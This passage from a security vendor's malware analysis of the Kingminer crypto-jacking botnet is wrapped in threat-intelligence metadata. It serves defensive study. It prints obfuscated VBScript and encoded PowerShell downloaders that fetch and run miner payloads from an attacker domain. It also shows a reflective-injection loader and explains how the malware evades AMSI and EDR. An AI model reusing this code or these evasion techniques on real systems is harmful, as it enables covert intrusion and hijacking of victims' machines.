& tlcyyzdozckfwqjlapy(“ed-Since”),tlcyyzdozckfwqjlapy(“0”)\nanfendjlea.send()\nIf anfendjlea.ReadyState = 4 And anfendjlea.Status = 200 Then\nxfwztzstrianbdobpjyg = anfendjlea.ResponseText\nEnd If\nSet anfendjlea = Nothing\nIf Err.number <> 0 Then Err.Clear\nEnd Function\nFunction epahtbqjownex(base64)\nSet awighgwbsbklb = CreateObject(tlcyyzdozckfwqjlapy(“ADODB.Str”) & tlcyyzdozckfwqjlapy(“eam”))\nWith awighgwbsbklb\n.Type = 1\n.Open\n.Write mxwkyhinoizevvq(base64)\n.SaveToFile cpllu, 2\n.Close\nEnd With\nSet awighgwbsbklb = Nothing\nEnd Function\nRandomize\npass1 = Int(Rnd*250)\npass2 = Int(Rnd*250)\npass3 = Int(Rnd*250)\ncpan = qiiwksoqz()\nweishu = hscdqmssmaiehbcguamv()\nIf weishu=tlcyyzdozckfwqjlapy(“x64”) Then\nkwenjian=tlcyyzdozckfwqjlapy(“64”) & tlcyyzdozckfwqjlapy(“.txt”)\ncplwen=tlcyyzdozckfwqjlapy(“cpl64.tx”) & tlcyyzdozckfwqjlapy(“t”)\nElse\nkwenjian=tlcyyzdozckfwqjlapy(“32”) & tlcyyzdozckfwqjlapy(“.txt”)\ncplwen=tlcyyzdozckfwqjlapy(“cpl”) & tlcyyzdozckfwqjlapy(“32.txt”)\nEnd If\nSet fvyvojwguxjtxtsxjvtv = GetObject(tlcyyzdozckfwqjlapy(“winmgmts:\\\\.\\root\\”) & tlcyyzdozckfwqjlapy(“cimv2”))\nSet bqwtehqcytputysra = fvyvojwguxjtxtsxjvtv.ExecQuery(tlcyyzdozckfwqjlapy(“SELECT *\nFROM Win32_Operatin”) & tlcyyzdozckfwqjlapy(“gSystem”))\nFor Each wmiObject In bqwtehqcytputysra\nbanben=Split(wmiObject.Version,tlcyyzdozckfwqjlapy(“.”))(0)\nNext\nurl1=tlcyyzdozckfwqjlapy(“h”) & tlcyyzdozckfwqjlapy(“ttp://”)&minute(now())&second(now())&tlcyyzdozckfwqjlapy(“.”)&(hex((year(now())-2000)&Month(now())&(day(now())\\32)&(year(now())-2000)))&tlcyyzdozckfwqjlapy(“f”) & tlcyyzdozckfwqjlapy(“dae.com/”)\nIf banben>5 Then\nmulu=cpan&tlcyyzdozckfwqjlapy(“\\”) & tlcyyzdozckfwqjlapy(“Users\\Public”)\nurl=url1\nElse\nmulu=cpan&tlcyyzdozckfwqjlapy(“\\Docume~1\\AllUse~1\\Ap”) & tlcyyzdozckfwqjlapy(“pLIC~1”)\nurl=url1\nEnd If\nmklu=mulu&tlcyyzdozckfwqjlapy(“\\mum”) & tlcyyzdozckfwqjlapy(“.txt”)\nfso.DeleteFile mulu&tlcyyzdozckfwqjlapy(“\\ghjj”) & tlcyyzdozckfwqjlapy(“jkkjkj”),True\nIf Not fso.FileExists(mulu&tlcyyzdozckfwqjlapy(“\\ghjjjkk”) & tlcyyzdozckfwqjlapy(“jkj”)) Then\nmulu=mulu&tlcyyzdozckfwqjlapy(“\\”)&Year(Now())&Month(Now())&Day(Now())&Hour(Now())&Day(Now())&Minute(Now())\nfso.CreateFolder mulu\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\ncpllu=mulu&tlcyyzdozckfwqjlapy(“\\”)&Minute(Now())&tlcyyzdozckfwqjlapy(“.cp”) & tlcyyzdozckfwqjlapy(“l”)\nIf fso.FileExists(mklu) Then\ndqvghtrbjhoprcpp mklu, klu\nElse\neeceudtczqdkwtjncas wpdpbhrdgigjmb(url&kwenjian),klu,mklu,pass1,pass2,pass3\nEnd If\nIf fso.FileExists(klu) Then\nepahtbqjownex xfwztzstrianbdobpjyg(url1&cplwen)\nElse\nfso.DeleteFile mklu,True\nEnd If\nIf fso.FileExists(cpllu) Then\nanhywquhuxkmsbrah.currentdirectory = mulu\nCreateObject(tlcyyzdozckfwqjlapy(“She”) & tlcyyzdozckfwqjlapy(“ll.Application”)).ControlPanelItem(cpllu)\nEnd If\nEnd If\nFunction tlcyyzdozckfwqjlapy(ByVal anhywquhuxkmsbrah)\nFor i =  1 To Len(anhywquhuxkmsbrah) Step 2\nc =  Mid(anhywquhuxkmsbrah, i, mmrvsowgpi)\ntlcyyzdozckfwqjlapy =  tlcyyzdozckfwqjlapy & Chr(Chr(38) & Chr(72) & c)\nNext\nEnd Function\n\nThe above script detects the CPU architecture it runs on and downloads a 32-bit (for x86 systems) or a 64-bit (for x64\nsystems) version of the payload (line 187) under the file _x.txt in the root of the Public user’s folder. This file is then_\ndecoded into mum.txt, which generally is an MZPE file XORed with a single byte key. We will talk about these files in detail\nwhen we discuss payloads. It also downloads a base64 encoded payload, decodes and moves it in \\Users\\Public\\<date_\n_hour_minute>\\ with a .cpl extension and runs it (line 193). An interesting aspect of this script is that the same Domain_\nGeneration Algorithm applies to build the URL to the payloads.\n\n##### Scheduled Task based execution\nThe other method by which r1.txt executes code is by scheduling tasks. Attackers chose to use the ActiveX object\n_Schedule.Service instead of interacting with schtasks.exe. The out-of-process execution nature of COM breaks the links_\nbetween the task scheduler and the task, exploiting a blind spot in some AV and EDR systems that don’t include a COM\nmonitoring component. There are two scheduled tasks with two different scripts. The first task, with the name Windows\n_System Helper, runs once every time the system starts. The second task, Windows Update Monitor, runs at a time interval_\nhard-coded in the script (line 108). In our case, it ran every 28 minutes.\n\n**Windows System Helper**\n\nThis task runs at every system startup with the command line\n\n##### system startup command line\npowershell.exe -c “$sc = New-Object -ComObject ScriptControl;$sc.Language = ‘VBScript’;$p=’5C717538792934387A34387B346D224B7D6C3879293825385B6A7D796C7D577A727D7B6C303A4F4B7B6A71686C364B707D74743A31224B7D6C387A3825387929365D607D7B303A766B747777736D6838767D6F6B367F2A2B6C706A367B77753A31225C77384F7071747D3856776C387A364B6C7C576D6C36596C5D767C577E4B6C6A7D7975227B3825387A364B6C7C576D6C364A7D797C59747430312254777768225C7175387C347D34387E226D38253830707D60303061\n7D796A3076776F303131352A282828313E5577766C703076776F3031313E307C79613076776F303131442B2A313E30617D796A3076776F303131352A2828283131313E3A7E7C797D367B77753A224B7D6C387C382538567D6F384A7D7F5D6068227C3648796C6C7D6A763825383A30447C6329342B6531443630447C6329342B6531443630447C6329342B6531443630292A28313A227C36517F76776A7D5B796B7D3825385E79746B7D227C365F74777A79743825384C6A6D7D224B7D6C387D3825387C365D607D7B6D6C7D307B3122517E387D365B776D766C38263828384C707D76226D3825387B706A307D36516C7D75302831366B\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n6B36516C7D75302931313E7B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302A31313E7B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302B31313E3A7E7F7070367B77753A225D767C38517E225E6D767B6C7177763879305A614E7974386B31225E7\n76A387138253829384C7738547D76306B31384B6C7D68382A227B38253855717C306B34387134382A3122517E38516B566D757D6A717B3055717C306B3438713438293131384C707D76227938253879383E385B706A303A3E503A383E387B31225D746B7D227938253879383E385B706A303A3E503A383E387B383E3855717C306B3438713833382A3438\n2A31312271382538713833382A225D767C38517E22567D606C225D767C385E6D767B6C717776225F7D6C577A727D7B6C303A6B7B6A71686C223A3E3A706C6C682237373A3E7571766D6C7D3076776F3031313E6B7D7B77767C3076776F3031313E3A363A3E6D3E3A376A2929366C606C3A31’;$p = for($i=0; $i -lt\n$p.length; $i+=2){[char](([byte][char][int]::Parse($p.substring($i,2),’HexNumber’))\n-bxor 29 -bxor 30 -bxor 27 -bxor 21 -bxor 21)};Start-Sleep -Seconds 120;$sc.AddCode((-join $p) -join ‘ ‘)”\n\nThe scheduled task executes Powershell to spawn a new ScriptControl COM object and executes the VBScript embedded\nin the command line. Malware authors choose this approach for multiple reasons. First, the execution remains fileless. Second, to avoid detection from various Powershell emulators that know how to emulate only Powershell code.\nFurthermore, as a COM object is used to execute VBScript, the command bypasses the AMSI scan of the encoded buffer.\n\nThe decoded script is the same downloader as presented before. It generates the URL in the same manner, concatenating\nthe current minute and second with the current date and fdae.com. This time, however, it downloads r11.txt from the\nattacker server and executes it. The downloaded script is a variant of the first stage script (r1.txt) with randomized\nvariables and some randomized hard-coded values, like XOR keys and the interval between the executions. Its purpose\nis to ensure persistence on the system by registering the scheduled tasks and the WMI event consumer again, in case\nthey were deleted in the meantime.\n\n**Windows Update Monitor**\n\nThe command which runs every 28 minutes is similar to the one used in the Windows System Helper task. It uses the\nScriptControl COM object and feeds the decrypted VBScript to it.\n\n##### script running every 28 minutes\npowershell.exe -c “$sc = New-Object -ComObject ScriptControl;$sc.Language = ‘VBScri\npt’;$p=’7776387D6A6A776A386A7D6B6D757D38767D606C225C717538792934387A34387B346D224B7D6C3879293825385B6A7D796C7D577A727D7B6C303A4F4B7B6A71686C364B707D74743A31224B7D6C387A3825387929365D607D7B303A766B747777736D6838767D6F6B367F2A2B6C706A367B77753A31225C77384F7071747D3856776C387A364B6C7C576D6C36596C5D767C577E4B6C6A7D7975227B3825387A364B6C7C576D6C364A7D797C59747430312254777768225C7175387C347D34387E22\n6D38253830707D603030617D796A3076776F303131352A282828313E5577766C703076776F3031313E30\n7C79613076776F303131442B2A313E30617D796A3076776F303131352A2828283131313E3A7E7C797D367B77753A224B7D6C387C382538567D6F384A7D7F5D6068227C3648796C6C7D6A763825383A30447C6329342B6531443630447C6329342B6531443630447C6329342B6531443630292A28313A227C36517F76776A7D5B796B7D3825385E79746B7D227C365F74777A79743825384C6A6D7D224B7D6C387D3825387C365D607D7B6D6C7D307B3122517E387D365B776D766C38263828384C707D76226D3825387B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302831313E7B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302931313E7B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302A31313E7B706A307D36516C7D75302831366B6D7A75796C7B707D6B36516C7D75302B31313E3A7E7F7070367B77753A225D767C38517E225E6D767B6C7177763879305A614E7974386B3\n1225E776A387138253829384C7738547D76306B31384B6C7D68382A227B38253855717C306B34387134382A3122517E38516B566D757D6A717B3055717C306B3438713438293131384C707D76227938253879383E385B706A303A3E503A383E387B31225D746B7D227938253879383E385B706A303A3E503A383E387B383E3855717C306B3438713833382A34382A3131227138253871383\n3382A225D767C38517E22567D606C225D767C385E6D767B6C717776224B7D6C38703825385B6A7D796C7D577A727D7B6C303A554B4055542A364B7D6A6E7D6A405554504C4C483A312270364B7D6C4C71757D576D6C6B382928282828342928282828342928282828342E2828282822703677687D76383A5F5D4C3A34383A706C6C682237373A3E7571766D6C7D3076776F3031313E6B7D7B77767C3076776F3031313E3A363A3E6D3E3A3768776F366C606C3A34387E79746B7D2270366B7D\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n767C3031227D607D7B6D6C7D30793070366A7D6B6877766B7D4C7D606C3131’;$p = for($i=0; $i -lt\n$p.length; $i+=2){[char](([byte][char][int]::Parse($p.substring($i,2),’HexNumber’))\n-bxor 29 -bxor 30 -bxor 27 -bxor 21 -bxor 21)};$sc.AddCode((-join $p) -join ‘ ‘)”\n\nThe decrypted script is again the VBScript downloader discussed above, in this case, downloading a file named pow.txt.\nThis is a big obfuscated Powershell script with random names for variables. By its structure, however, we can recognize\nthat it’s based on a PowerSploit component [10] performing reflective PE injection. The last few lines of the script contain\na downloader and decryptor part for obtaining the payload from the attacker’s server before injecting it into the victim\nrundll32 process. This shows that the threat actors are capable of customizing existing tools to their own needs.\n\n##### downloader part\nFunction Main\n{\nif (($PSCmdlet.MyInvocation.BoundParameters[“Debug”] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[“Debug”].IsPresent)\n{\n$LSuyfjVk99 = “Continue”\n}\nWrite-Verbose “zaqwer”\n$cccXiQlG99 = New-Object System.Net.WebClient\n$PEUrl=$QmDvMERT99+”64.txt”\nif ([IntPtr]::Size -lt 8)\n{\n$PEUrl=$QmDvMERT99+”32.txt”\n}\nfor($i=1;$i -le 2;$i++)\n{\nif (Test-Path $ming)\n{\n[Byte[]]$csWsfcNL99 = [System.IO.File]::ReadAllBytes((Resolve-Path $ming))\nif($csWsfcNL99[-1] -eq 100 -and $csWsfcNL99[-2] -eq 99 )\n{\n$yi4=$csWsfcNL99[-4]\n$yi5=$csWsfcNL99[-5]\n$yi6=$csWsfcNL99[-6]\nfor($i=0; $i -lt $csWsfcNL99.count; $i++) {\n$csWsfcNL99[$i] = $csWsfcNL99[$i] -bxor $yi6 -bxor $yi5 -bxor $yi4\n}\n$csWsfcNL99[-6]= $csWsfcNL99[-7]\n$csWsfcNL99[-5]= $csWsfcNL99[-7]\n$csWsfcNL99[-4]= $csWsfcNL99[-7]\nbreak\n}\n}\n\n[Byte[]]$csWsfcNL99 = $cccXiQlG99.DownloadData($PEUrl)\nif($csWsfcNL99[-1] -eq 98 -and $csWsfcNL99[-2] -eq 97 )\n{\n$yi1=Get-Random -minimum 1 -maximum 127\n$yi2=Get-Random -minimum 1 -maximum 127\n$yi3=Get-Random -minimum 1 -maximum 127\n[Byte[]]$cnSWOelc99=$csWsfcNL99\nfor($i=0; $i -lt $cnSWOelc99.count; $i++) {\n$cnSWOelc99[$i] = $cnSWOelc99[$i] -bxor $yi1 -bxor $yi2 -bxor $yi3\n}\n$cnSWOelc99[-4]=$yi1\n$cnSWOelc99[-5]=$yi2\n$cnSWOelc99[-6]=$yi3\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n$cnSWOelc99[-2]=99\n[System.IO.File]::WriteAllBytes($ming,$cnSWOelc99)\nbreak;\n}\nStart-Sleep -Seconds 100\n}\n$csWsfcNL99[-1]=$csWsfcNL99[-4]\n$csWsfcNL99[-2]=$csWsfcNL99[-4]\nfor($i=0; $i -lt $csWsfcNL99.count; $i++) {\n$csWsfcNL99[$i] = $csWsfcNL99[$i] -bxor $csWsfcNL99[-3]\n}\n$pTQivNWl99 = ($csWsfcNL99[0..1] | % {[Char] $_}) -join ‘’\nif ($pTQivNWl99 -ne ‘MZ’)\n{\nthrow ‘zaqwer’\n}\n$csWsfcNL99[0] = 0\n$csWsfcNL99[1] = 0\nif ($dfLyyUjK99 -ne $null -and $dfLyyUjK99 -ne ‘’)\n{\n$dfLyyUjK99 = “ReflectiveExe $dfLyyUjK99”\n}\nelse\n{\n$dfLyyUjK99 = “ReflectiveExe”\n}\nInvoke-Command -ScriptBlock $RbcTWlAd99 -ArgumentList @($csWsfcNL99, $CDSPHCQU99,\n$VzCLxgnW99, $RfdpoXGg99,$PRHVoCqZ99)\n\nIt downloads in memory either a 32-bit or a 64-bit payload (depending on the CPU architecture it runs on), it invokes\n_rundll32.exe with a benign Control Panel Item existing on the system (main.cpl) and it injects the payload into the memory_\nof rundll32. The command line of rundll32.exe contains the parameters that the payload will use:\n\n“C:\\Windows\\system32\\rundll32.exe” Shell32.dll,Control_RunDLL “C:\\Windows\\system32\\\nmain.cpl” -QmDvMERT99 hxxp://133142.320dcfdae.com/ -ming dad.txt -PRHVoCqZ99\n\nThe URL that appears in the command line is controlled by the attacker, and the mining tool can communicate with it\nwhen needed.\n\nThis time we have dad.txt downloaded to the same folder structure \\Users\\Public\\<date_hour_minute> and executing in\nthe context of the injected rundll32.exe.\n\nWe have this infection chain and payload delivery method made up of complex file-less executions, capable of downloading\nand executing anything the attacker wants. So let’s look at the delivered payloads:\n\n##### Payloads\nWe had captured several payloads downloaded from the attacker’s server when we generated the URLs as the scripts do\nwith the DGA.\n\n**mum.txt and dad.txt, a family of miners**\n\nThe file mum.txt arrives on the system as a result of the WMI event consumer script. It is an MZPE encrypted with a single\nbyte XOR. Upon decryption, we identified it as a version of XMRig, a widespread cryptocurrency miner. In subsequent\nruns, it downloads slightly different variants of XMRig to evade static detection. These files are not present on Virustotal.\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n_Dad.txt is also a variant of XMRig, downloaded as a result of the scheduled Powershell script running periodically. It_\ntries to evade static detection by employing the same single byte XOR encryption to its MZPE.\n\n**<random_number>.cpl**\n\nDownloaded from the WMI event consumer script, a very small MZPE with some exported functions generally exported\nby .cpl files; however, their code seems to be only a stub. Control Panel Items (.cpl files) are small executables that\nallow users to change system settings. Threat actors frequently use these files because they may bypass application\nwhitelisting and, by launching a .cpl file, Windows automatically executes them in the context of a rundll32 process\nlaunched from control.exe. This might seem benign at first, when an incident responder checks what runs on the\nsystem.\n\nThe downloaded .cpl files are always variants of the Kingminer cryptocurrency miner and they are detected as such on\nVirustotal.\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n### Too much ado about a crypto-miner?\n\nThe payloads themselves are not necessarily disruptive for the users (except that the system might underperform\ndue to high CPU usage). The dangerous part is the payload delivery method, consisting of various defense-evasion\ntechniques. The scripts developed by the malware authors are hard to detect for multiple reasons. Randomized\nvariable names, obfuscated code, and payloads encrypted with random keys might evade static detection if the rest of\nthe script is not specific enough. Also, using WMI and COM objects during execution might avoid behavioral detection\nbecause attackers rely on legitimate system components to perform malicious actions. Let’s see some examples\ncaptured with Procmon during dynamic analysis:\n\nThe first one shows us that using the Schedule.Service ActiveX object for task scheduling moves the action into the\ncontext of a legitimate svchost.exe process, responsible for handling these kinds of requests during the operating\nsystem’s execution.\n\nThe second example demonstrates how attackers make it challenging to correlate where execution comes from,\nby launching a powershell.exe from a scheduled task (svchost.exe), thus splitting the process tree so the original\n_wscript.exe is nowhere to find. This way, even if one of the payloads gets detected by a security solution, there is no_\ninformation about the link between the payload and the first stage script or even the scheduled tasks, and the bot can\npersist on the system.\n\nAnother way to abuse legitimate Windows components is running scripts from scrcons.exe, which is responsible\nfor executing event consumer scripts. Its parent is svchost.exe, making it hard to trace back to the original script.\nAlso, because it frequently runs on a system in legitimate cases, some AV might not even monitor its actions. In the\nfollowing images, we can see how this process starts up, and it downloads our payloads.\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nFinally, by mimicking Control Panel Items, the attackers leverage how Windows executes .cpl files by default. First,\n_control.exe launches and invokes rundll32.exe to load Shell32.dll with a specific function, Control_RunDLL to load the_\n.cpl file in memory.\n\nThen, rundll32.exe performs all the actions, and executing a cryptocurrency miner uses the system’s resources to the\nmaximum. In the following image, we can see how a rundll32.exe process communicates with the C&C.\n\nAnother layer of defense evasion consists of using a Domain Generation Algorithm to avoid blacklisting the URLs by\nwhich infected machines download payloads.\n\n### Impact\n\nWe did not see any component of this malware designed to steal information or disrupt any activity. However, with the\ncomplex persistence mechanism and payload delivery, attackers have the means to deploy more advanced threats.\nThe only purpose of the attackers for now is to stay hidden for as long as possible to mine cryptocurrencies. However,\nthe fact that users got infected points to some underlying issues, and IT administrators should be careful about them.\nWeak credentials to access SQL databases allowed attackers to add malicious commands and start the infection.\nLack of Windows updates that fix vulnerabilities might mean that they can use kernel exploits like EternalBlue to spread\nthe malware further. An essential measure to defend against such attacks is to harden the environment by enforcing\nstrong passwords and keeping software components up to date.\n\n## Campaign distribution\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n## Conclusion\n\nWhile cryptocurrency miners don’t get much attention due to their low impact on users, sometimes the way these\ncampaigns are organized might teach us, security researchers and practitioners, a few lessons. The whole infection\nchain shows us that the actors behind it are capable of conducting a sophisticated attack. They combine publicly\navailable tools like Mimikatz or Powersploit with scripts customized to serve their needs (r1.txt, downloader). The\npayload delivery method is dangerous if it goes undetected, so security solutions should detect and correlate as\nmany techniques as possible to provide adequate protection. Users should strengthen their passwords and keep their\noperating systems and installed software up to date.\n\n## Bibliography\n\n[[1] https://www.sophos.com/en-us/medialibrary/pdfs/technical-papers/sophos-labs-kingminer-botnet-report.pdf](https://www.sophos.com/en-us/medialibrary/pdfs/technical-papers/sophos-labs-kingminer-botnet-report.pdf)\n\n[[2] https://research.checkpoint.com/2018/kingminer-the-new-and-improved-cryptojacker/](https://research.checkpoint.com/2018/kingminer-the-new-and-improved-cryptojacker/)\n\n[[3] https://www.bitdefender.com/business/usecases/wannacry.html](https://www.bitdefender.com/business/usecases/wannacry.html)\n\n[[4] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)\n\n[[5] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708)\n\n[[6] https://docs.microsoft.com/en-us/windows/win32/wmisdk/--intervaltimerinstruction](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--intervaltimerinstruction)\n\n[[7] https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer)\n\n[[8] https://docs.microsoft.com/en-us/windows/win32/wmisdk/–eventfilter](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventfilter)\n\n[[9] https://docs.microsoft.com/en-us/windows/win32/wmisdk/–filtertoconsumerbinding](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--filtertoconsumerbinding)\n\n[[10] https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)\n\n## MITRE techniques breakdown\n\n|Initial Access|Execution|Persistence|Privilege Escalation|Defense Evasion|Command and Control|Impact|\n|---|---|---|---|---|---|---|\n|Exploit Public-Facing Application|Component Object Model and Distributed COM|Scheduled Task|Exploitation for Privilege Escalation|Control Panel Items|Domain Generation Algorithms|Resource Hijacking|\n|Valid Accounts|Control Panel Items|Windows Management Instrumentation Event Subscription|Valid Accounts|Mshta|||\n||Scheduled Task|||Rundll32|||\n||Scripting|||Scripting|||\n||Windows Management Instrumentation||||||\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n## Appendix 1. Indicators of Compromise\n\n### Hashes\n\nKingminer:\n\n1FC5F79D6D3209A427D04046F237372E\n\n21454A23AAE073FF7B96DDA061946B8C\n\nXMRig:\n\n3EA2D5E55A58309B49EADA14A007B3B8\n\nB7070B9B317BAC578A9AC487C31879BC\n\n3A5964C56EF16456A6B6911BEB549372\n\n### IP Address\n\n185.234.216.133\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n\n-----\n\n##### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nmedium enterprises, service providers and technology integrators. We take thousands of resellers and distributors worldwide.\npride in the trust that enterprises such as Mentor, Honeywell, Yamaha,\n**Speedway, Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n##### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with\n**VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n##### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.bitdefender.com/files/News/CaseStudies/study/354/Bitdefender-PR-Whitepaper-KingMiner-creat4610-en-EN-GenericUse.pdf"
    ],
    "report_names": [
        "Bitdefender-PR-Whitepaper-KingMiner-creat4610-en-EN-GenericUse.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1594117848,
    "ts_modification_date": 1594117851,
    "files": {
        "pdf": "https://archive.orkl.eu/7721e884008ccb409c7e668093ad183ef479c168.pdf",
        "text": "https://archive.orkl.eu/7721e884008ccb409c7e668093ad183ef479c168.txt",
        "img": "https://archive.orkl.eu/7721e884008ccb409c7e668093ad183ef479c168.jpg"
    }
}